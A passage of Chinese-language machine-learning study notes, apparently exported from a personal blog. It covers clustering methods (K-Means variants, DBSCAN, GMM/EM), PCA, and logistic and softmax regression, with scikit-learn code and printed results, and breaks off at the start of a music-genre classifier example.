曼哈顿距离(p=1)：$$\\displaystyle{d_1(x,y)=\\sum_{i=1}^n|x_n-y_n|}$$ 欧式距离(p=2)：$$\\displaystyle{d_2(x,y)=\\sqrt{(x-y)^T(x-y)}}$$ 切比雪夫距离(p=$\\infty$)：$$\\displaystyle{d_\\infty(x,y)=\\max\\limits_{i\\in\\{1,2\\dots n\\}}|x_i-y_i|}$$ 余弦距离：$$\\displaystyle{d_{\\cos}(x,y)=\\frac{x^Ty}{||x||·||y||}} \\in [-1,1]$$ Jaccard相似系数：$$\\displaystyle{J(A,B) = \\frac{|A\\cap B|}{|A \\cup B|} = \\frac{|A\\cap B|}{|A|+|B|-|A\\cap B|}}$$ K-Means变种 K-Mediods：计算新的簇中心的时候不再选择均值，而选择中位数。抗噪能力得到加强 二分K-Means：合并簇中心点比较近，MSE很小的簇；切分簇中心点比较远，MSE比较大的簇。重新进行K-Means聚类 K-Means++：使初始化簇中心稍微远一点。随机选择第一个中心点，计算MSE，将MSE转化为概率进行概率化选择初始簇中心点 Canopy聚类： 一次迭代，给出k的值以及k个初始中心点（然后进行K-Means算法） 层次聚类（Hierarchical Clustering） 分裂法 思想：将所有样本归为一个簇。每次迭代在一个簇中找到距离最远的两个样本点，将该簇划分为两个子簇。依次类推直到划分为k个簇 凝聚法 思想：将所有样本点看作一个独立的簇。每次迭代找到距离最小的两个簇进行合并。 密度聚类 DB-SCAN聚类（Density_Based Spatial Clustering of Applications with Noise） 与层次聚类不同，它将簇定义为密度相连的点的最大集合，能够把具有高密度的区域划分为簇，并可有效地对抗噪声 密度相连 直接密度可达（若对象q的e邻域内至少有m个对象，m指定。则q为核心对象） 若给定一个对象集合D，如果p在q的e邻域内，而q是一个核心对象，则p从q出发是直接密度可达的 若q直接密度可达r，r直接密度可达p，则q直接密度可达p 密度可达：如果存在一个对象链使得相邻两对象直接密度可达，则称对象链首尾密度可达 密度相连：若o密度可达p，o密度可达q，则p，q密度相连 DB-SCAN通过检查数据集中每个对象的e邻域来寻找聚类 如果一个点p是核心对象则以p为中心创建新簇。依据p来反复寻找密度相连的集合（可能合并原有簇），当没有新点时寻找结束 密度最大值聚类 局部密度： $$ \\displaystyle{\\rho_i = \\sum_j\\chi(d_{ij}-d_c), 其中 \\chi(x) = } \\begin{cases} 1 \u0026, x \u003c 0 \\\\ 0 \u0026, otherwise \\end{cases} $$ $D_c$ 是一个截断距离，$\\rho_i$ 即到对象 $i$ 的距离小于 $D_c$ 的对象的个数，即： $\\rho_i$ = 任何一个点以 $D_c$ 为半径的圆内的样本点的数量， $D_c$ 的设定经验是使每个点的邻居数目是所有点的 1% ~ 2% 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 import time import numpy as np import matplotlib.pyplot as plt from sklearn.datasets import make_blobs # 生成高斯blob数据 from sklearn.cluster import KMeans,AgglomerativeClustering,DBSCAN # KMeans、层次、密度聚类 from sklearn.metrics import adjusted_rand_score,silhouette_score from sklearn.preprocessing import StandardScaler titles = [\u0026#39;Ground Truth\u0026#39;,\u0026#39;K-Means(random)\u0026#39;,\u0026#39;K-Means++\u0026#39;,\u0026#39;K-Means(Canopy)\u0026#39;,\u0026#39;Hierarchical\u0026#39;,\u0026#39;DBSCAN\u0026#39;] # colors = [ # \u0026#39;#e41a1c\u0026#39;, \u0026#39;#377eb8\u0026#39;, \u0026#39;#4daf4a\u0026#39;, \u0026#39;#984ea3\u0026#39;, # 红 蓝 绿 紫 # \u0026#39;#ff7f00\u0026#39;, \u0026#39;#ffff33\u0026#39;, # 橙 黄 # \u0026#39;#1b9e77\u0026#39;, \u0026#39;#d95f02\u0026#39;, \u0026#39;#7570b3\u0026#39;, \u0026#39;#e7298a\u0026#39;, # 青 棕 靛 洋红 # \u0026#39;#66a61e\u0026#39;, \u0026#39;#666666\u0026#39; # 草绿 深灰 # ] # markers = [ # \u0026#39;o\u0026#39;, # 圆 # \u0026#39;s\u0026#39;, # 方 # \u0026#39;^\u0026#39;, # 上三角 # \u0026#39;d\u0026#39;, # 钻石 # \u0026#39;v\u0026#39;, # 下三角 # \u0026#39;p\u0026#39;, # 五边形 # \u0026#39;*\u0026#39;, # 星号 # \u0026#39;h\u0026#39;, # 六边形1 # \u0026#39;H\u0026#39;, # 六边形2 # \u0026#39;8\u0026#39;, # 八边形 # \u0026#39;\u0026gt;\u0026#39;, # 右三角 # \u0026#39;\u0026lt;\u0026#39; # 左三角 # ] # 数据可视化 def data_visualization_only(x,y): plt.scatter(x[:,0],x[:,1],s=12,c=y) plt.show() def data_visualization_all(labels,times): fix,axes = plt.subplots(2,3,figsize=(20,12)) axes = axes.flatten() for index,(ax,lab,tit,t) in enumerate(zip(axes,labels,titles,times)): ax.scatter(X[:,0],X[:,1],c=lab,s=12,cmap=\u0026#39;tab10\u0026#39;,) ax.set_title(f\u0026#34;{tit}({t:.4f}s)\u0026#34;) # ax.set_title(tit+\u0026#34;(\u0026#34;++\u0026#34;s)\u0026#34;) ax.set_xticks([]) ax.set_yticks([]) plt.tight_layout() plt.show() # 一 构造模拟数据 centers = [(0,0),(8,8),(-5,10),(10,-4)] # 样本中心 cluster_std = [1.2, 0.8, 2.0, 0.5] # 标准差 n_samples = [800,600,400,200] # 样本数量 X,y_true = make_blobs( n_samples=n_samples, centers=centers, cluster_std=cluster_std, random_state=42 ) # data_visualization_only(X,y_true) # 二 算法实现 def kmeans_random(X, k): \u0026#39;\u0026#39;\u0026#39; 标准K-Means算法，随机选择初始中心 \u0026#39;\u0026#39;\u0026#39; start = time.time() model = KMeans( n_clusters=k, init=\u0026#39;random\u0026#39;, n_init=10, random_state=42 ) labels = model.fit_predict(X) return labels,time.time()-start def kmeans_pp(X,k): \u0026#39;\u0026#39;\u0026#39; K-Means++:智能初始化，远离地选择中心 \u0026#39;\u0026#39;\u0026#39; start=time.time() model = KMeans( n_clusters=k, init=\u0026#39;k-means++\u0026#39;, n_init=10, random_state=42 ) labels = model.fit_predict(X) return labels,time.time()-start def kmeans_canopy(X,t1=4.0,t2=2.0): \u0026#39;\u0026#39;\u0026#39; K-Means+Canopy。智能选择k和初始化中心 \u0026#39;\u0026#39;\u0026#39; start = time.time() canopies=[] X_copy = X.copy() np.random.shuffle(X_copy) for pt in X_copy: if any(np.linalg.norm(pt-c) \u0026lt; t2 for c in canopies): continue canopies.append(pt) k = len(canopies) model = KMeans( n_clusters=k, init=np.vstack(canopies), n_init=1, random_state=42 ) labels = model.fit_predict(X) return labels,time.time()-start def hierarchical(X,k): \u0026#39;\u0026#39;\u0026#39; 凝聚层次聚类，使用Ward方差最小化准则 \u0026#39;\u0026#39;\u0026#39; start = time.time() model = AgglomerativeClustering( n_clusters=k, linkage=\u0026#39;ward\u0026#39; ) labels = model.fit_predict(X) return labels,time.time()-start def dbscan(X): \u0026#39;\u0026#39;\u0026#39; 密度聚类DBSCAN \u0026#39;\u0026#39;\u0026#39; start = time.time() X_stand = StandardScaler().fit_transform(X) model = DBSCAN( eps = 0.35, # 指定e邻域 min_samples=5 # 指定m ) labels = model.fit_predict(X_stand) return labels,time.time()-start # 三 数据训练 k_true = len(set(y_true)) labels_random ,t_random = kmeans_random(X,k_true) labels_pp ,t_pp = kmeans_pp(X,k_true) labels_canopy ,t_canopy = kmeans_canopy(X,30,15) labels_hier ,t_hier = hierarchical(X,k_true) labels_dbscan ,t_dbscan = dbscan(X) labels = [ y_true, labels_random, labels_pp, labels_canopy, labels_hier, labels_dbscan ] times = [ 0, t_random, t_pp, t_canopy, t_hier, t_dbscan ] # 四 结果评估 def evaluate(name,labels,time): ari = adjusted_rand_score(y_true,labels) # 任意一对样本，看“预测是否同簇”与“真实是否同类”一致的比例 # 轮廓系数：a为样本与同簇其他点的平均距离；b是样本与最近邻簇所有点的平均距离 # 轮廓系数 si_i = (b-a)/max(a,b)。轮廓系数约接近1，簇间距离越远，簇内距离约近，聚类越理想 sil = silhouette_score(X,labels) if len(set(labels))\u0026gt;1 else np.nan print(f\u0026#34;{name:15s} | ARI={ari:5.3f} | Sil={sil:5.3f} | Time={time:.3f}s\u0026#34;) for index,(label,time) in enumerate(zip(labels,times)): evaluate(titles[index],label,time) # 五 可视化 data_visualization_all(labels,times) Ground Truth | ARI=1.000 | Sil=0.801 | Time=0.000s K-Means(random) | ARI=0.999 | Sil=0.801 | Time=0.012s K-Means++ | ARI=0.999 | Sil=0.801 | Time=0.014s K-Means(Canopy) | ARI=0.823 | Sil=0.687 | Time=0.013s Hierarchical | ARI=1.000 | Sil=0.801 | Time=0.068s DBSCAN | ARI=0.999 | Sil=0.769 | Time=0.025s 高斯混合模型（GMM模型） 单个高斯分布（GM） 高斯分布：$N(\\mu,\\sigma)$ 通过MLE思想估计 $\\mu$ 和 $\\sigma$ : $$\\displaystyle{\\hat \\mu=\\frac{1}{n}\\sum_{i \\in \\{1,2 \\dots n\\}} x_i=\\bar x}$$ $$\\displaystyle{\\hat \\sigma^2=\\frac{1}{n}\\sum_{i \\in \\{1,2 \\dots n\\}}(x_i-\\hat\\mu)^2$$ 混合高斯模型（GMM） GMM：假设随机变量 $X$ 是由 $k$ 个高斯分布混合而来，取到各个高斯分布的概率为 $\\pi_1,\\pi_2 \\dots \\pi_k$ ，第 $i$ 个高斯分布的均值为 $\\mu_i$ ，标准差为 $\\sigma_i$ 。当前观测到一系列样本 $X_1,X_2\\dots X_n$ ，估计参数向量： $\\pi，\\mu，\\sigma$ $$\\displaystyle{L_{\\pi,\\mu,\\sigma}(X) = \\sum^N_{i=1}\\log P(X_i)\\overset{\\text{全概率公式}}{=}\\sum^N_{i=1}\\log(\\sum^K_{k=1}\\pi_kN(x_i|\\mu_k,\\sigma_k))}$$ EM算法求解估计 $\\pi，\\mu，\\sigma$ EM算法 Jensen不等式：若f是凸函数，x是随机变量。有： $$f(\\mathcal{E}x) \\le \\mathcal{E}f(x),\\displaystyle{\\sum_i \\mathcal{E}_i=1}$$ E-Step（求责任度）与M-Step（更新参数） GMM流程 变量介绍： $ N $ 为数据集中样本总数量 $ N_k $ 为第 $ k $ 个高斯分布的有效数据点数量 $ K $ 为聚类数（即预设的高斯分布数量） $ X $ 为整个数据集（ $ X_i $ 为第 $ i $ 个数据向量） $ \\pi_k $ 为第 $ k $ 个高斯分布的混合系数/权重 $ \\mu_k $ 为第 $ k $ 个高斯分布的均值向量 $ \\sigma_k $ 为第 $ k $ 个高斯分布的协方差 $ \\gamma(i,k) $ 为责任度或响应度（即E步计算核心） 第零步：随机找 $m$ 个数据（中心点） 确定初始 $\\pi,\\mu,\\sigma$ ，例如随机等 第一步：估计数据来源于哪个分布(E步——责任度) 代入：$$\\displaystyle{\\gamma(i,k) = P(X \\in Z_k | X=X_i) \\overset{\\text{贝叶斯公式}}{=} \\frac{\\pi_kN(X_i|\\mu_k,\\sigma_k)}{\\displaystyle{\\sum^K_{j=1}\\pi_jN(X_i|\\mu_j,\\sigma_j)}}}$$ 根据 $\\gamma$ 划分类别 第二步：更新参数（$\\pi，\\mu，\\sigma$）（M步——参数更新） $$\\displaystyle{N_k=\\sum^N_{i=1}\\gamma(i,k)}$$ $$\\displaystyle{\\mu_k = \\frac{1}{N_k}\\displaystyle{\\sum_{i}^N\\gamma(i,k)X_i}}$$ $$\\displaystyle{\\sigma_k = \\frac{1}{N_k}\\sum^N_{i=1}\\gamma(i,k)(x_i-\\mu_k)(x_i-\\mu_k)^T}$$ $$\\displaystyle{\\pi_k = \\frac{N_k}{N}=\\frac{1}{N}\\sum_{i=1}^N\\gamma(i,k)}$$ 第三步：迭代，直到 $\\pi,\\mu,\\sigma$ 不再变化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import time import numpy as np import matplotlib.pyplot as plt from sklearn.datasets import make_blobs # 生成高斯blob数据 from sklearn.mixture import GaussianMixture from sklearn.metrics import adjusted_rand_score,adjusted_mutual_info_score,silhouette_score from sklearn.preprocessing import StandardScaler # 数据可视化 def data_visualization_only(x,y): plt.scatter(x[:,0],x[:,1],s=12,c=y) plt.show() # 一 构造模拟数据 centers = [(0,0),(8,8),(-5,10),(10,-4)] # 样本中心 cluster_std = [1.2, 0.8, 2.0, 0.5] # 标准差 n_samples = [800,600,400,200] # 样本数量 X,y_true = make_blobs( n_samples=n_samples, centers=centers, cluster_std=cluster_std, random_state=42 ) # 二 用BIC在2~8个成分里面选最佳GMM(看看几个候选成分时解释力最好) n_componenrs_range = range(2,9) gmms=[GaussianMixture(n,random_state=42).fit(X) for n in n_componenrs_range] bics = [g.bic(X) for g in gmms] best_gmm = gmms[np.argmin(bics)] print(gmms.index(best_gmm)) # 三 聚类与评估 y_pred = best_gmm.predict(X) ari = adjusted_rand_score(y_true,y_pred) ami = adjusted_mutual_info_score(y_true,y_pred) sil = silhouette_score(X,y_pred) print(f\u0026#34;ARI: {ari:.3f} AMI: {ami:.3f} Silhouette: {sil:.3f}\u0026#34;) # data_visualization_only(X,y_true) data_visualization_only(X,y_pred) 2 ARI: 1.000 AMI: 1.000 Silhouette: 0.801 降维 降维方法： 特征提取：特征映射。把高维空间的数据映射到低维空间。比如PCA和基于神经网络的降维等 特征选择： 过滤式（打分机制）：通过某个阈值进行过滤。比如根据方差、信息增益、互信息过滤经常会看到但可能不会去用的信息 独立于任何机器学习算法。它基于数据本身的统计特征（如相关性、互信息）对特征进行评分和筛选，就像用一个“过滤器”把不好的特征过滤掉。 优点：快，计算开销小，不依赖具体模型。 缺点：可能忽略特征与模型的协同作用，选出的特征单独看很强，但组合起来对特定模型可能不是最优的。 互信息：$$\\displaystyle{I(X;Y)=\\sum_{x\\in X}\\sum_{y \\in Y}P(X=x,Y=y)\\log_2\\frac{P(X=x,Y=y)}{P(X=x)P(Y=y)}}$$ 包裹式：每次迭代产生一个特征子集，评分 将模型性能作为评价标准。它会尝试不同的特征子集，并用一个特定的机器学习模型去评估每个子集的性能（比如准确率）。 优点：针对性强，选出的特征子集对该模型通常性能最优。 缺点：非常慢，计算开销大，容易过拟合。 嵌入式：先通过机器学习模型训练来对每个特征提到一个权值。接下来和过滤式类似，通过设定某个阈值来筛选特征 特征选择的过程嵌入在模型训练过程之中。模型在训练的同时会自动进行特征选择。 优点：平衡了效率和效果，比过滤式更针对模型，比包裹式快很多。 缺点：依赖于具有内置特征选择机制的模型。 PCA降维 算法过程（对于样本矩阵 $X_{m×n}$，从 $n$ 维到 $k$ 维） 1、数据标准化（中心化）：计算每个特征的均值 $ X_{mean} $ ，另 $ X_c=X-X_{mean} $ 2、计算协方差矩阵：$$\\displaystyle{\\Sigma = \\frac{1}{m-1}X_c^TX_c}$$ 3、特征值分解（正交对角化）： $$ \\begin{aligned} \u0026\\Sigma=\\chi\\Lambda \\chi^T = \\begin{bmatrix} \\xi_1,\\xi_2 \\dots \\xi_n \\end{bmatrix} \\begin{bmatrix} \\lambda_1 \\\\ \u0026 \\lambda_2 \\\\ \u0026\u0026 \\ddots \\\\ \u0026\u0026\u0026 \\lambda_n \\end{bmatrix} \\begin{bmatrix} \\xi_1,\\xi_2 \\dots \\xi_n \\end{bmatrix}^{T}\\\\ \u0026 \\lambda_1 \\ge \\lambda_2 \\ge \\dots \\ge \\lambda_n \\end{aligned} $$ 4、选择主成分（$\\lambda_1,\\lambda_2\\dots \\lambda_k,k\u0026lt;n$） 保留信息量（方差贡献量）：$$\\displaystyle{\\eta_{k/n} = \\frac{\\displaystyle{\\sum_{i=1}^k\\lambda_i}}{\\displaystyle{\\sum_{i=1}^n\\lambda_i}}}$$ 截取投影矩阵： $$ \\chi_k = \\begin{bmatrix} \\xi_1,\\xi_2 \\dots \\xi_k \\end{bmatrix} $$ 5、投影（降维）： $Z=X_c·\\chi_k$ Kernel PCA KernelPCA首先将 $X_{m×n}$ 升维映射到 $K_{n×n}$ $K_{i,j} = F_k(X_i,X_j)$ ， $F_k$ 为核函数 特征值特征向量的求解：SVD分解 直接对 $X_c$ 进行SVD分解：$$X_c = U·\\Sigma·V^T$$ $ U $ 是一个 $ m×m $ 的正交矩阵，左奇异向量 $ \\Sigma $ 是一个 $ m×n $ 的对角矩阵，对角线上的值 $ \\sigma_i $ 是奇异值。 $$\\displaystyle{\\lambda_i=\\frac{\\sigma_i^2}{m-1}}$$ $ V $ 是一 $ n×n $ 的正交矩阵，右奇异向量。 $$V = \\chi $$ ","date":"2025-12-02T19:45:17+08:00","image":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%97%A0%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/cover_hu_e21c7d461f016ad9.png","permalink":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%97%A0%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/","title":"机器学习-无监督学习"},{"content":" 目录 Logistic回归（逻辑回归） —— 二分类 将多分类问题转化为双分类问题 Softmax回归（归一化函数回归） —— 多分类 实践——音乐分类器 0、初始化 1、数据处理与特征存储 2、模型训练与存储 3、测试与评估 支持向量机（SVM，Support Vector Machine）与感知机（Perceptron） SMO算法 SVM概率化输出 SVM合页损失 线性分类（Linear Classification） 逻辑回归算法：在多元线性回归算法的基础上把结果缩放到0-1之间 线性分类器（GLM与分布的连接器，可以通过内部核函数升维变成非线性算法）：$$\\eta = \\theta^Tx = \\theta_0+\\theta_1x_1+……+\\theta_nx_n$$ 广义线性模型（GLM）：$\\displaystyle{p(y;\\eta)=b(y)e^{(\\eta^TT(y)-a(\\eta))}}$，其中$\\eta$是自然参数，$T(y)$是充分统计量，$a(\\eta)$是对数部分函数 Logistic回归（逻辑回归）：伯努利-GLM Softmax回归（归一化函数回归）：多项式分布-GLM Logistic回归（逻辑回归） —— 二分类 伯努利分布： $$ \\displaystyle{P(y;p) = p^y (1-p)^{1-y}, \\quad y=0,1 \\Rightarrow P(y;p)=e^{(ln(\\frac{p}{1-p})y+ln(1-p))}}\\displaystyle{\\Rightarrow \\eta=ln(\\frac{p}{1-p})\\Rightarrow p=\\frac{1}{1+e^{-\\eta}}\\Rightarrow p(x)=\\frac{1}{1+e^{-\\theta^Tx}} } $$ 逻辑回归函数（Sigmoid）： $$ \\displaystyle{\\hat y = h_\\theta(x)=g(\\theta^Tx)=\\frac{1}{1+e^{-\\theta^Tx}}} \\Rightarrow 分界:\\theta^Tx=0 $$。当 $\\hat y\u0026gt;0.5$ 时，$y$ 取1；当 $\\hat y\u0026lt;0.5$ 时，$y$ 取0 损失函数（由极大似然推导而来）： $$ \\displaystyle{J(\\theta)=-[\\sum^m_{i=1}y^{(i)}lnh(x^{(i)})+(1-y^{(i)})ln(1-h(x^{(i)})]} $$ 梯度下降： $$ \\displaystyle{\\theta_j^{(k+1)} = \\theta_j^{(k)}-\\alpha\\frac{\\partial}{\\partial_{\\theta_j^{(k)}}}J(\\theta^{(k)})} $$ $$ \\displaystyle{\\frac{\\partial}{\\partial_{\\theta_j^{(k)}}}J(\\theta^{(k)}) = \\frac{1}{n}\\sum^n_{i=1}(h_\\theta(x_i)-y_i)x^{(j)}_i} \\Rightarrow \\nabla_{\\theta^{(k+1)}}J(\\theta^{(k+1)}) = \\frac{1}{n}X^T(X\\theta^{(k)}-y) $$ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # Sigmoid Function import numpy as np import math import matplotlib.pyplot as plt def sigmoid_function(x): return 1/(1+np.exp(-x)) x = np.linspace(-10,10,1000) y = sigmoid_function(x) plt.xlim(-10,10) plt.ylim(0,1) plt.plot(x,y) plt.plot([0,0],[0,sigmoid_function(0)],\u0026#39;k--\u0026#39;) plt.plot([-10,0],[0.5,sigmoid_function(0)],\u0026#39;k--\u0026#39;) plt.plot(0,sigmoid_function(0)) plt.plot(0,0.5,\u0026#39;ko\u0026#39;) plt.text(0.1, 0.5 + 0.001, \u0026#39;(0 , 0.5)\u0026#39;, fontsize=14, ha=\u0026#39;left\u0026#39;, va=\u0026#39;bottom\u0026#39;) plt.show() ​ ​\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 # 二分类实例：乳腺癌 from sklearn.datasets import load_breast_cancer from sklearn.linear_model import LogisticRegression from sklearn.preprocessing import StandardScaler from sklearn.model_selection import train_test_split from sklearn.pipeline import Pipeline from sklearn.metrics import accuracy_score import numpy as np import matplotlib.pyplot as plt # 载入参数 X,y = load_breast_cancer(return_X_y=True) # 划分测试集与训练集 X_train,X_test,y_train,y_test = train_test_split( X,y, test_size=0.3, random_state=20230428, stratify=y) # # 标准归一化 # scaler = StandardScaler() # X_train_scaled = scaler.fit_transform(X_train) # X_test_scaled = scaler.fit_transform(X_test) # # 模型训练 # lg_reg = LogisticRegression() # lg_reg.fit(X_train_scaled,y_train) # # 预测 # y_train_pre = lg_reg.predict(X_train_scaled) # y_test_pre = lg_reg.predict(X_test_scaled) # # 评估 # print(\u0026#34;Train:\u0026#34;, accuracy_score(y_train,y_train_pre)*100,\u0026#34;%\u0026#34;) # print(\u0026#34;Test:\u0026#34;,accuracy_score(y_test,y_test_pre)*100,\u0026#34;%\u0026#34;) # 归一化 —— 评估可用Pipeline实现 log_reg = Pipeline([ (\u0026#39;scaler\u0026#39;,StandardScaler()), (\u0026#39;clf\u0026#39;,LogisticRegression()) ]) log_reg.fit(X_train,y_train) print(\u0026#34;Test:\u0026#34;,log_reg.score(X_train,y_train)*100,\u0026#34;%\u0026#34;) print(\u0026#34;Train:\u0026#34;,log_reg.score(X_test,y_test)*100,\u0026#34;%\u0026#34;) Test: 99.49748743718592 % Train: 96.49122807017544 % 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # 二分类实例：鸢尾花三分类 =\u0026gt; 二分类 from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.linear_model import LogisticRegression from sklearn.preprocessing import StandardScaler from sklearn.metrics import accuracy_score from sklearn.pipeline import Pipeline # 0:\u0026#39;setosa\u0026#39;, 1:\u0026#39;versicolor\u0026#39;, 2:\u0026#39;virginica\u0026#39; X,y = load_iris(return_X_y=True) y = (y==2).astype(int) # 二分化 X_train,X_test,y_train,y_test = train_test_split(X,y,test_size=0.3, random_state=200304) log_reg = Pipeline([ (\u0026#39;scaler\u0026#39;,StandardScaler()), (\u0026#39;clf\u0026#39;,LogisticRegression()) ]) log_reg.fit(X_train,y_train) print(\u0026#39;Train accuracy: {:.2f} %\u0026#39;.format(log_reg.score(X_train, y_train) * 100)) print(\u0026#39;Test accuracy: {:.2f} %\u0026#39;.format(log_reg.score(X_test, y_test) * 100)) Train accuracy: 97.14 % Test accuracy: 93.33 % 将多分类问题转化为双分类问题 One-vs-all（One-vs-rest）：以鸢尾花分类问题为例。将三分类问题转换为三个二分类问题（分别为是否为\u0026rsquo;setosa\u0026rsquo;，是否为\u0026rsquo;versicolor\u0026rsquo;以及是否为\u0026rsquo;virginica\u0026rsquo;）。得到三个预测值，取最大 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # OneVsRestClassifier from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.linear_model import LogisticRegression from sklearn.multiclass import OneVsRestClassifier from sklearn.preprocessing import StandardScaler from sklearn.metrics import accuracy_score from sklearn.pipeline import Pipeline # 0:\u0026#39;setosa\u0026#39;, 1:\u0026#39;versicolor\u0026#39;, 2:\u0026#39;virginica\u0026#39; X,y = load_iris(return_X_y=True) X_train,X_test,y_train,y_test = train_test_split(X,y,test_size=0.3, random_state=200304) log_reg = Pipeline([ # (\u0026#39;scaler\u0026#39;,StandardScaler()), (\u0026#39;ovr\u0026#39;,OneVsRestClassifier( LogisticRegression() ) ) ]) log_reg.fit(X_train,y_train) print(\u0026#39;Train accuracy: {:.2f} %\u0026#39;.format(log_reg.score(X_train, y_train) * 100)) print(\u0026#39;Test accuracy: {:.2f} %\u0026#39;.format(log_reg.score(X_test, y_test) * 100)) Train accuracy: 93.33 % Test accuracy: 97.78 % 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # 转化为三个二分类问题 from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.linear_model import LogisticRegression from sklearn.preprocessing import StandardScaler from sklearn.metrics import accuracy_score from sklearn.pipeline import Pipeline import numpy as np # 0:\u0026#39;setosa\u0026#39;, 1:\u0026#39;versicolor\u0026#39;, 2:\u0026#39;virginica\u0026#39; X,y = load_iris(return_X_y=True) temp = [] X_train,X_test,y_train_init,y_test = train_test_split(X,y,test_size=0.3, random_state=200304) for category in [0,1,2]: y_train = (y_train_init==category) log_reg = LogisticRegression() log_reg.fit(X_train,y_train) temp.append(log_reg.predict_proba(X_test)[:,1]) result = np.empty(len(temp[0])).reshape(-1,1) for i in range(len(temp)): result = np.c_[result,temp[i].reshape(-1,1)] result = result[:,1:] y_test_pre = np.argmax(result,axis=1) acc = (y_test_pre==y_test) print(\u0026#39;Test accuracy: {:.2f} %\u0026#39;.format( (acc.sum()/len(acc))* 100)) Test accuracy: 97.78 % Softmax回归（归一化函数回归） —— 多分类 多项式分布： $$\\displaystyle{P(X_1=x_1,\\dots,X_k=x_k;p_1,p_2,\\dots,p_k) = \\frac{n!}{x_1! \\cdots x_k!} p_1^{x_1} \\cdots p_k^{x_k}, \\quad \\sum_{i=1}^k x_i = n}\\displaystyle{\\Rightarrow P(y;\\varphi)=e^{\\displaystyle{\\sum^{k-1}_{i=1}T(y)_iln(\\frac{\\varphi_i}{\\varphi_k})+ln\\varphi_k}} = e^{\\displaystyle{\\eta^TT(y)-a(\\eta)}}}\\Rightarrow\\displaystyle{P_i = P({y^{(i)};\\Theta})=P_k e^{\\displaystyle{\\Theta^{(i)}x}}},\\displaystyle{P_k=\\frac{1}{{\\displaystyle{\\sum^{k}_{j=1}e^{\\displaystyle{\\Theta^{(j)}x}}}}}}$$， $\\displaystyle{\\Theta^{(i)}}$ 为 $\\Theta$ 的第 $i$ 行 Softmax回归函数：$$ \\displaystyle{P(y^{(i)}=k|x^{(i)};\\theta) = \\frac{\\displaystyle{e^{\\theta_k^Tx^{(i)}}}}{\\displaystyle{\\sum^k_{j=1}e^{\\theta_j^Tx^{(i)}}}}} $$，此时 $\\theta$ 是一个矩阵 损失函数——交叉熵损失函数（Cross-Entropy Loss，负对数似然损失）：$$ \\displaystyle{J(\\theta)=-\\frac{1}{N}\\sum^{N}_{n=1}\\sum^{k}_{i=1}y_i^{(n)}ln(\\hat y_i^{(n)})} $$，其中 $N$ 是样本数， $k$ 是分类数， $y_i^{(n)}$ 是真实标签，服从one-hot编码， $\\hat y_i^{(n)}$ 是预测概率，取值为 $(0,1) $ 当y的分类数为2时，Softmax回归退化为Logistc回归 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.linear_model import LogisticRegression from sklearn.preprocessing import StandardScaler from sklearn.metrics import accuracy_score from sklearn.pipeline import Pipeline X,y = load_iris(return_X_y=True) X_train,X_test,y_train,y_test = train_test_split( X,y, test_size=0.3, random_state=200304 ) pipe = Pipeline([ (\u0026#39;scaler\u0026#39;,StandardScaler()), (\u0026#39;clf\u0026#39;,LogisticRegression(# 默认Softmax solver=\u0026#39;sag\u0026#39;, max_iter=1000, )) ]) pipe.fit(X_train,y_train) pipe.score(X_test,y_test) 0.9777777777777777 实践——音乐分类器 数据集路径： \u0026ldquo;.\\Dataset\\2_Music_Classifier\u0026rdquo; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 from scipy.fft import fft,fftfreq # 快速傅里叶转换 from scipy.io import wavfile # 读取wav文件格式 from matplotlib.pyplot import specgram as spg # 绘制频谱图 import matplotlib.pyplot as plt from itertools import product path = \u0026#34;./Dataset/2_Music_Classifier/\u0026#34; # wavfile返回样本率（每秒采样个数，单通道采样总数） # sample_rate,X = wavfile.read(\u0026#34;./Dataset/2_Music_Classifier/blues/converted/blues.00000.au.wav\u0026#34;) # 绘图查看 def frequence_time(mtype,mserial): sample_rate,X = wavfile.read(path+mtype+\u0026#34;/converted/\u0026#34;+mtype+\u0026#34;.\u0026#34;+mserial+\u0026#34;.au.wav\u0026#34;) plt.specgram(X,Fs=sample_rate,xextent=(0,30)) # plt.plot(fft(X,sample_rate)) plt.title(\u0026#34;frequence_time:\u0026#34;+ mtype + \u0026#34;-\u0026#34; + mserial[-1]) plt.ylabel(\u0026#39;frequence\u0026#39;) plt.xlabel(\u0026#39;time\u0026#39;) def magnitude_time(mtype,mserial): sample_rate,X = 